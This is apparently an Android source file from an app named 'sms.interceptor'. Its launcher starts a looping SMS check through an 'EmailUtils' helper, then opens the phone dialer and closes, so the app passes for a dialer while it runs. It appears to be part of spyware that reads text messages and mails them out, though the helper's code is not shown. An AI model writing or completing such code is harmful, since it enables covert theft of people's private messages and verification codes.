package com.sms.interceptor;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

/**
 * Created by zhangfei on 15/9/20.
 */
public class MainActivity extends Activity{

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EmailUtils.checkSmsInLoop(this);

        Uri uri = Uri.parse("tel:");
        Intent intent = new Intent(Intent.ACTION_DIAL, uri);
        startActivity(intent);
        finish();
    }
}
